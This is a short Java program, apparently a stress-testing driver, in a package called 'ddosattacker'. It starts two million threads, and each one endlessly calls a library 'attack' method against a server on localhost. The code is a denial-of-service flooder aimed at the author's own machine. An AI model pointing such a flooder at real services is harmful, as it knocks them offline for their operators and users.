package com.tugalsan.trm.ddosattacker;

import com.tugalsan.api.thread.server.*;
import com.tugalsan.api.url.client.*;
import com.tugalsan.api.url.server.*;
import java.util.stream.*;

public class Main {
    //cd C:\me\codes\com.tugalsan\trm\com.tugalsan.trm.ddosattacker
    //java --enable-preview --add-modules jdk.incubator.concurrent -jar target/com.tugalsan.trm.ddosattacker-1.0-SNAPSHOT-jar-with-dependencies.jar

    public static void main(String... args) {
        var url = TGS_Url.of("https://localhost:8081/hello1");
        IntStream.range(0, 2000000).forEach(i -> TS_ThreadRun.now(() -> {
            while (true) {
                TS_UrlDDosUtils.attack(url);
                System.out.println(".");
            }
        }));
        TS_ThreadWait.minutes(null, 1);
    }
}
